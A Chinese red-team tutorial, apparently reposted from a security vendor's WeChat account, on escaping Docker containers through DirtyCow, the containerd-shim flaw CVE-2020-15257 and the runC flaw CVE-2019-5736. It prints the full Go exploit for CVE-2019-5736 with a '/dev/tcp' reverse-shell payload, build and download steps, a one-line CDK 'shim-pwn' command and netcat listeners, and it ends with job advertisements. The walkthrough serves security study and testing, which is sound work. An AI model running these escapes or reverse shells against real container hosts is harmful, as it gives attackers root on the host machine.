> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/myvFLyMiKK8MpLqB7CtPtQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/hiaiaLeG6N1zItD3hicyicTUxCsdYyvSZWKOQ4y3CslMX5EINOxRsoicGxHxJnwtXjIau4usI94yHUKXTqh4LyuVL4A/640?wx_fmt=gif)

因全文整体内容较长，将文章拆分为多篇在本公众号发出，欢迎大家关注~

上期内容阅读：  
[九维团队 - 红队（突破）| 云安全 - Docker 逃逸手法（上）](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247526399&idx=1&sn=742aa9945173f63fecf46ee51a2e1c77&chksm=9ae126c7ad96afd1019531af19447bc83adcb50a00bd9103ea6f48d3974e0594bc4189db1fd5&scene=21#wechat_redirect)  

  

  

**三、Docker 逃逸问题二：**

**系统本身内核问题**

**概述**

Docker 容器不同于虚拟机，它与宿主机操作系统共享内核。宿主机和容器之间通过内核命名空间（namespaces）、内核 Capabilities、CGroups（control groups）等技术进行隔离。

当宿主主机的内核存在安全漏洞时会一并影响 Docker 的安全，所以其实就是找内核漏洞，攻击者直接可以利用 Docker 容器和宿主机操作系统之间的内核漏洞来实现逃逸。实现直接获取宿主机 root 权限。

因为 docker 和宿主机内核版本是一样，可以直接在 docker 内查看内核版本：

```
uname -a 
或 hostnamectl | grep -i kernel 
或 cat /proc/version 

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyUHXz9hOsfvtv2STLTr6UhhfiaeicH2UshGCJCPe2gwqtMj4bcz6sC49g/640?wx_fmt=png)

下面就挑了一个常见的脏牛漏洞。

**逃逸方法**

_**3.1 逃逸方法一：DirtyCow 脏牛漏洞 CVE-2016-5195**_

**漏洞描述：**

Docker 与 宿主机共享内核。利用 DirtyCow。假如宿主机内核版本较低，可以试试。

Dirty Cow（CVE-2016-5195）是 Linux 内核中的权限提升漏洞，源于 Linux 内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。当一个进程尝试写入只读页面时，内核需要将该页面复制到新的内存空间，并将其设置为可写，以便进程可以继续进行写入操作。

然而，在漏洞存在的情况下，攻击者可以通过多次并发访问同一页面，从而触发内核中的竞争条件，使得内核仅执行第一次写入，但未正确处理其他访问。这样一来，攻击者可以获取对只读页面的写访问权限，并可能修改敏感数据或提升特权级别。

**影响版本：**

前置条件：需要宿主机的版本内核足够低（阿里云环境不满足条件了）。

**漏洞利用：** 

直接使用内核提权漏洞 exp 即可，找一个脏牛漏洞 exp 直接打。这里我用了 ubuntu-14.04.5 来测试，内核版本 4.4.0-31-generic。

```
http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04.5-server-amd64.iso

```

‍* 左右滑动查看更多  

配合容器：

```
https://github.com/gebl/dirtycow-docker-vdso/blob/main/Dockerfile

```

‍* 左右滑动查看更多

这里就主要记录一下如何确认一下当前内核版本是否存在脏牛漏洞。

方法一：直接检查内核版本

（区别于第二种直接打的方法，这种就是保守一点）。

其实主要是看看内核是不是打过补丁的版本。

Debian 运行命令：

```
uname -v

```

Ubuntu/Centos/RHEL 运行命令：

```
uname -r， 或者cat /etc/os-release

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyYOZQuLAcAibxDupqHANPIJic3C7bVcvuGj1yqqXBgGbmTUqgkNtIiaibbw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbky6jUuq5ARc9iaVeOiaZOibrzcJNxZIGcfticQ2dzbntMvdx87zvqDicw42FA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyDhFXCDgGamOVIqaFKeo7X1KribAGx58hwwoK6TjrLusicZ07miaSRgyAA/640?wx_fmt=png)

以下是主流发行版修复后的内核版本, 如果版本低于以下，说明存在风险（主要是从 2007-2016 年间的 Linux）。

```
Centos7 /RHEL7    3.10.0-327.36.3.el7
Cetnos6/RHEL6     2.6.32-642.6.2.el6
Ubuntu 16.10      4.8.0-26.28
Ubuntu 16.04      4.4.0-45.66
Ubuntu 14.04      3.13.0-100.147
Debian 8          3.16.36-1+deb8u2
Debian 7          3.2.82-1

```

‍* 左右滑动查看更多

可以配合这个工具使用（不过会存在误报）：

```
https://github.com/The-Z-Labs/linux-exploit-suggester

```

‍* 左右滑动查看更多

方法二：直接上 exp

（因为上面几个版本也只是网上非官方找的，内核版本的命名机制太混乱了，也不保证这几个版本号肯定是对的，所以建议能直接上 poc 就直接测了）。

利用手法可以看看视频： 

```
[还没给你的Docker打上脏牛补丁？坏消息来了]
https://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&mid=2651069205&idx=3&sn=2c79678bcfcde9113f3d6848277ffa0a&chksm=bd14abc68a6322d0d5855c5d8ec3b8c5cf7c75886b3b7464c242adc1864cfb1af22bf63a39d7&mpshare=1&scene=23&srcid=1105rp9r0ZahYZNG6KJufSkp# rd

```

‍* 左右滑动查看更多

POC：

```
https://github.com/scumjr/dirtycow-vdso

```

‍* 左右滑动查看更多

使用方法：

```
cd /dirtycow-vdso/
make # 编译
./0xdeadbeef IP:Port 
# 支持接收反弹shell的地址，如果不加参数默认是127.0.0.1:1234 docker容器本机上的直接执行

```

‍* 左右滑动查看更多

提一个视频里可能会有疑问的问题，视频中有一步是修改 IP 的操作（修改 playload.c 文件中的 IP 值），文件中的 IP 是 16 进制模式的（IP equ 0x030018AC） 视频中的 ipconfig IP 为 172.24.0.3。

IP 地址是一个 32 位的二进制数，通常以十六进制表示。在这个例子中 0x030018AC，二进制数为：00000011 00000000 00011000 10101100 ⇒ 十进制就是 3 0 24 172。这里有个关键就是网络字节存储用了小端模式。因此实际 IP 就是 172.24.0.3。

防止忘记，顺带附上脏牛官方的 poc：

```
https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c
https://github.com/Brucetg/DirtyCow-EXP（已编译）

```

‍* 左右滑动查看更多

**四、Docker 逃逸问题三：**

**Docker 软件设计不当**

**概述**

docker 组件设计过程中自身存在的一些漏洞。

**逃逸方法**

_**4.1 逃逸方法一：Docker Containerd 漏洞 CVE-2020-15257**_

**漏洞原理：**

Containerd 是一个控制 runC 的守护进程，提供命令行客户端和 API，用于在一个机器上管理容器。在特定网络条件下，攻击者可通过访问 containerd-shimAPI，从而实现 Docker 容器逃逸。  

在版本 1.3.9 和 1.4.3 之前的容器中，当 docker 以 —-net=host 参数启动时，容器与 host 共享一套 Network namespaces（容器的网络配置和主机完全一样，使用主机的 IP 地址和端口，可以查看到主机所有网卡信息、网络资源），containerd-shim API 暴露给了 docker 容器下。

填充程序的 API 套接字的访问控制仅仅验证了连接进程的有效 uid 为 0，但没有限制对抽象 unix 域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效 UID 为 0，但特权降低）导致新进程以提升的特权运行。

简单来说就是：docker 容器以 --net=host 启动会暴露 containerd-shim 监听的 Unix 域套接字。特定版本的 Containerd 未做权限控制，可以实现提权。

**影响版本：**

```
containerd < 1.3.9
containerd < 1.4.3

```

**漏洞利用：**

这里用的环境是：

```
apt-get install docker-ce=5:19.03.6\~3-0\~ubuntu-xenial docker-ce-cli=5:19.03.6\~3-0\~ubuntu-xenial containerd.io=1.2.4-1

```

‍* 左右滑动查看更多

安装好后，查看当前 containerd 版本 docker version。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyUQSofrvUAWjxFLa0Kmhk4QfYfce9iaPEdMEtU07F1FD1I1ogkIWd3SQ/640?wx_fmt=png)

随便 pull 一个容器启动，使用 --net=host 启动参数：

```
docker run -itd --net=host ubuntu:18.04 /bin/bash

```

‍* 左右滑动查看更多

当我们在 docker 内时如何判断当前容器是否存在风险？

是否能获取 containerd-shim 监听的 Unix 域套接字： 

```
cat /proc/net/unix|grep -a "containerd-shim”

```

‍* 左右滑动查看更多

可以看到抽象命名空间 Unix 域套接字 。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyfecOpwVcD8yGd0CUYjfAcDTrbIdNEc3klLK5V5tfkvLqGhUBQACUdw/640?wx_fmt=png)

这里的 @/containerd-shim/moby/{sha256}.sock 抽象 Unix 域套接字，没有依靠 mnt 命名空间做隔离，而是依靠网络命名空间做隔离。因此我们可以通过操作 containerd-shim API 进行逃逸。

直接一键 POC + 监听端口。下载了全版本利用文件，当然也可以根据 docker 宿主机内核版本选择对应的 poc wget。

```
https://github.com/Xyntax/CDK/releases/download/0.1.6/cdk_v0.1.6_release.tar.gztar -zxvf cdk_v0.1.6_release.tar.gz./cdk_linux_amd64 run shim-pwn IP PORT

```

‍* 左右滑动查看更多

使用公网 VPS 进行监听。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkym5J503YmawfWD3L93uGhE0mBXaeOrOgmmmNDTgWWUicbdSvLh4cPjTg/640?wx_fmt=png)

获得了反弹 shell。 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyzSKy4yiaEbMe0CRn3KDibicDTcJxAWDWwthDZVgx0ic6SoNaHFqVrj41KQ/640?wx_fmt=png)

_**4.2 逃逸手法二：Docker RunC 组件漏洞 CVE-2019-5736**_

限制：需要等待宿主机执行 exec 进入当前 docker 容器时候，才能获取到宿主机权限。如果没有人在宿主机执行的话，是无法进行 docker 逃逸的。 

注意：该漏洞逃逸后可能会影响 docker 环境使用，在实际测试过程中 docker 服务崩了好几次，快照回退了好几次，在真实环境下建议还是慎用！！！

```
笔者看到网上说是会覆盖runc文件。可以先备份一份
cp /usr/bin/docker-runc drc_bak

```

‍* 左右滑动查看更多

**漏洞描述：**

漏洞点在于 runC，RunC 是一个容器运行时，最初是作为 Docker 的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为 “低级别” 容器运行时，runC 主要由 “高级别” 容器运行时（例如 Docker）用于生成和运行容器，尽管它可以用作独立工具。

像 Docker 这样的 “高级别” 容器运行时通常会实现镜像创建和管理等功能，并且可以使用 runC 来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。攻击者可以通过特定的容器镜像或者 exec 操作获取到宿主机 runc 执行时的文件句柄并修改掉 runc 的二进制文件，从而获取到宿主机的 root 执行权限。

**攻击步骤：**

1、将容器内的 / bin/sh 程序覆盖为# !/proc/self/exe；

2、持续遍历容器内 / proc 目录，读取每一个 / proc/[PID]/cmdline，对 runc 做字符匹配，直到找到 runc 进程号；

3、以只读的方式打开 / proc/[runc-PID]/exe，拿到文件描述符 fd；

4、持续以写方式打开只读 fd，直到 runc 结束占用后，写方式打开成功，通过该 fd 向宿主机的 / usr/bin/runc 写入攻击载荷；

5、runc 最后将执行用户通过 docker exec 执行的 / bin/sh。因为第一步，实际将执行宿主机上的 runc，而 runc 已经在第四步被覆盖掉。

**影响版本：**

```
docker version <=18.09.2
RunC version <=1.0-rc6

```

**漏洞利用：**

搭建环境比较麻烦，得在本地虚拟机新装个低版本有漏洞的 docker。 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyTmvOXxEib30xeeulgkNpibicsX2SdsUjTZuEsvwEpVvfxRLFyiciaqkjviag/640?wx_fmt=png)

先编译 go 脚本，生成攻击 payload。

```
https://github.com/Frichetten/CVE-2019-5736-PoC

```

‍* 左右滑动查看更多

C 语言的 POC：

```
https://github.com/agppp/cve-2019-5736-poc

```

‍* 左右滑动查看更多

需要修改一下 PoC 内容，脚本中的反弹地址为自己的 vps。

```
var payload = "# !/bin/bash \n bash -i >& /dev/tcp/xxx.xx.xx.xx/1234 0>&1"

```

‍* 左右滑动查看更多

```
package main
// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
    "fmt"
    "io/ioutil"
    "os"
    "strconv"
    "strings"
)
// This is the line of shell commands that will execute on the host
var payload = "# !/bin/bash \n bash -i >& /dev/tcp/xxx.xx.xx.xx/1234 0>&1"
func main() {
    // First we overwrite /bin/sh with the /proc/self/exe interpreter path
    fd, err := os.Create("/bin/sh")
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Fprintln(fd, "# !/proc/self/exe")
    err = fd.Close()
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Println("[+] Overwritten /bin/sh successfully")
    // Loop through all processes to find one whose cmdline includes runcinit
    // This will be the process created by runc
    var found int
    for found == 0 {
        pids, err := ioutil.ReadDir("/proc")
        if err != nil {
            fmt.Println(err)
            return
        }
        for _, f := range pids {
            fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
            fstring := string(fbytes)
            if strings.Contains(fstring, "runc") {
                fmt.Println("[+] Found the PID:", f.Name())
                found, err = strconv.Atoi(f.Name())
                if err != nil {
                    fmt.Println(err)
                    return
                }
            }
        }
    }
    // We will use the pid to get a file handle for runc on the host.
    var handleFd = -1
    for handleFd == -1 {
        // Note, you do not need to use the O_PATH flag for the exploit to work.
        handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
        if int(handle.Fd()) > 0 {
            handleFd = int(handle.Fd())
        }
    }
    fmt.Println("[+] Successfully got the file handle")
    // Now that we have the file handle, lets write to the runc binary and overwrite it
    // It will maintain it's executable flag
    for {
        writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
        if int(writeHandle.Fd()) > 0 {
            fmt.Println("[+] Successfully got write handle", writeHandle)
            writeHandle.Write([]byte(payload))
            return
        }
    }
}

```

‍* 左右滑动查看更多

编译生成 payload：

```
set CGO_ENABLED=0 
set GOOS=linux 
set GOARCH=amd64 
go build main.go

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyiarUR2tR2V5vvFCVneu8zOxs1qAasKRGTHgaoNH1F0fx7dePJvhusvw/640?wx_fmt=png)

拷贝到 docker 容器中执行（可以在 vps 上用 python 起个临时的 web 服务，docker 使用 wget 远程下载 ）。 

```
python2 -m SimpleHTTPServer 80、python3 -m http.server 8001

```

  

‍* 左右滑动查看更多

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbky2Y3F5fg5v59tgv2N9bkibibfvpSia0jPLhX04kjTPIMj7K4o9Vj9CWkmw/640?wx_fmt=png)

修改提权脚本权限，测试一下当前环境是否出网（因为环境改了好几次才测试成功，有些截图内容不对应请忽略）。 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyzC8JY6TO2TlsSyuXtsFB9euq6WFlqXzoyecKiazJrF3zdfRT3icibg1iaQ/640?wx_fmt=png)

一切没问题，在 vps 启动监听端口并运行提权脚本。 

```
vps：nc -lvnp 1234
docker: ./docker5736rce

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyoYzOO4DJSO4CicsibCwc6yTiaA1kPxN7eCqeBB0ibfg087KyGzl8Kyxv9g/640?wx_fmt=png)

然后模拟管理员进入容器（使用 / bin/sh），这里是在 kali 里搭的环境，可能是内核版本有点 bug，所以会有 while loading shared libraries: libseccomp.so.2:cannot open shared object file: No such file or directory 的报错，影响不大。 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyIvGenpk2icdibStGkib2FOZAibZmeOCrH5iaVaa7xKxVt6HnKCl928oNZKA/640?wx_fmt=png)

过一会 vps 上就可以收到反弹 shell 了。

查看当前 ifconfig, 确实是我的 kali 靶机了，逃逸成功（当然，逃逸后 docker 环境又坏了，实战还是要慎用）。 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyDB92iaTGDSyfYiasSAsIYpE6fazGcgaicvINMLCgGicW9OhA99z4T4qlgA/640?wx_fmt=png)

（未完待续）

**参考资料及推荐阅读：**

```
CVE-2019-5736 runc容器逃逸漏洞分析
https://x3fwy.bitcron.com/post/runc-malicious-container-escape
渗透测试之Docker逃逸
https://xz.aliyun.com/t/8558# toc-0
『杂项』Docker 逃逸方法汇总
https://mp.weixin.qq.com/s/FeOsaMgTMI0AwN7UzTjxAg
脏牛漏洞-Docker逃逸POC（dirtycow-vdso)代码分析
https://blog.csdn.net/enjoy5512/article/details/53196047
【云原生渗透】- containerd-shim容器逃逸漏洞(CVE-2020-15257)
https://zhuanlan.zhihu.com/p/471532280
host模式容器逃逸漏洞（CVE-2020-15257）技术分析
https://mp.weixin.qq.com/s/WmSaLPnG4o4Co1xRiYCOnQ
CVE-2019-14271分析与复现
https://ssst0n3.github.io/post/网络安全/安全研究/容器安全/进程容器/服务器容器/docker/历史漏洞分析与复现/docker-software/plumbing/docker-cp/CVE-2019-14271/分析/CVE-2019-14271分析与复现.html
CVE-2019-5736 runc容器逃逸漏洞分析
https://x3fwy.bitcron.com/post/runc-malicious-container-escape
Docker SYS_ADMIN 容器逃逸原理解析
https://www.freebuf.com/vuls/264843.html
Docker安全性与攻击面分析
https://zhuanlan.zhihu.com/p/152052618

```

* 左右滑动查看更多

**插播一条招聘信息**

_**一、安全研究工程师实习生（25/26 届）**_

**工作地点：深圳  
岗位职责：**  
1、具有较强的责任感、具备能够独立的开展工作的能力、自学能力强、做事踏实认真；   
2、对防御对抗、反溯源、攻击利用等相关红队工具进行研究和开发；  
3、熟悉 OWASP TOP 10，具有网络安全、系统安全、Web 安全等方面的理论基础；  
4、熟悉常见编程语言中的一种（Java、Python、PHP、GO），并能够熟练写出针对性的测试脚本；  
5、参与区域内网渗透测试、代码审计、红蓝对抗活动、最新漏洞动态跟踪及复现、风险评估、客户培训等工作；  
6、主要参与新服务、新技术创新服务的研究;  
7、根据 ATT&CK 框架梳理研究相关 TPPs，并形成对应的检测规则。  
**加分项：**  
1、具有渗透测试经验或逆向分析能力或溯源分析能力，曾经参与过大型的红蓝对抗项目;  
2、熟悉 Java、Python、PHP、GO 等编程，并有良好的编程习惯和丰富的代码经验；  
3、具备钻研精神，愿意在安全领域做出技术突破；  
4、具有较强的责任感、具备能够独立的开展工作的能力、自学能力强、做事踏实认真；   

_**二、代码审计工程师实习生（25/26 届）**_**  
工作地点：深圳  
岗位职责：**  
1、跟踪和分析业界最新安全漏洞。  
2、挖掘 Java、PHP 程序中未知的安全漏洞和代码缺陷，并对漏洞进行验证，编制安全加固报告;  
3、主要参与新服务、新技术创新服务的研究;  
任职要求：  
1、对 JAVA/PHP 编程有较深入的了解，具备较强的 Java/PHP 代码审计能力，有丰富实战能力；  
2、熟悉 JAVA/PHP 主流框架，具备有一定的编程能力；  
3、深入理解常见安全漏洞产生原理及防范方法；  
4、熟练掌握源代码测试工具及测试流程，有 CNVD、CNNVD 等漏洞证书、CVE 或 CTF 比赛获奖者者优先。  
5、熟悉主流的源代码审计工具；  
6、思路清晰，具有优秀的分析、解决问题的能力，有良好的学习能力及团队协作能力；  
7、具备较强的沟通能力、抗压能力，团队合作精神及钻研精神。

**简历投递可扫描本文末二维码添加小编微信，或直接发送至邮箱 securityteam@dbappsecurity.com.cn**  

* * *

**往期回顾**

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zKpjPyCLWDplWsoicpaYve1GiaLEyKY3eGVUVSliaHWDuLD3CI6LfYib0pQQic8ibibjjV2dwof7B2lVZgMw/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247529194&idx=1&sn=b1a9b20de509a2b2dc66d9c4f38705ee&chksm=9ae133d2ad96bac4f8f4a76341244f3b0dab8ed599b719d52612f7f64830f0deb0763db9c58c&scene=21#wechat_redirect)

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zKZLkuia9xpAvxQFd3GzVSibicDVZ3X4nW1kqRPIwm4ZyWQSYwJTZYRPmYPgtsic2demqnlnouoDk9L5g/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247528506&idx=1&sn=1bf5c562ed861f22f18fbb83ebc235a8&chksm=9ae13102ad96b814f440af9988d483d77bea9f00b94e3bf858763aa7bcf0c189cb025bc2ec18&scene=21#wechat_redirect)

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zKITAgdZlP1L1icWHicQFnyG4tVfLEoTLWpqHYibI8ANAIzkC8Ehker51SeyleKW2NEGysCNdUYgRO7w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247528444&idx=1&sn=e23dda8bf06109c0a9f87fbfd224d4cf&chksm=9ae12ec4ad96a7d2b7e0a89ec824b1dd879dd2a5abb9bf5a797ba91ea7197859535723e7bcdb&scene=21#wechat_redirect)

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zLics4MIIJQ3Lcx0CALia2Qk04sc8TTJbyZ0pDlibBPukOWewq0Scw9bbbTMgJiagvaAgLDQR1DvFJ44w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247527680&idx=1&sn=ac232081b46f022466cb7e151a8425b7&chksm=9ae12c38ad96a52e2d0cd626fa0f99c26fde9cb538804150a28acbc9596e4aae7a206b70d581&scene=21#wechat_redirect)[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zI3BjkWick2vSSJnmWBpRwuyk7DMNSxYqTOwvEy4Ee53xAnT7nfAbVicx68benP5kVzhDyG75Ph0Ueg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247527503&idx=1&sn=1ffb2a6e1e07fe2a79e7ba934bdf0f66&chksm=9ae12d77ad96a4610ae7da3505b76d6776869a5d3180ed302c3ba13363564e6ac17695647c6e&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Ljib4So7yuWjVsaTygX5CCGxuYZaPeibrpfOOGAjXfTkTp3AIPeXv08iayGTH94Xcmvk4RJxs9NNSc2vzCoCiaXOSQ/640?wx_fmt=jpeg&wx_co=1&wxfrom=5&wx_lazy=1)

  

**关于安恒信息安全服务团队**

**安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。**

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zIFIDZlXFuQeZrcKrV7Zd8Aeg98Fw5jzbGBgUW1hVQXIV3YpLZncEYibgw7MFwWtDU5vwnE2QFVP7A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zL31gt4m6YIRLh7wJeOSwYPOIblCvhN6OgHhV9NMJNH0TBianlpMmRbaKG1ia7iaPsWb4UX4ImgfEJ0A/640?wx_fmt=jpeg&wx_co=1&wxfrom=5&wx_lazy=1)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/hiaiaLeG6N1zItD3hicyicTUxCsdYyvSZWKOCUgD3ep5Jp4DE8e2S2Y3WnxsKjicicOg3OsGGRc9NPibQ61aRAqNXZQDA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)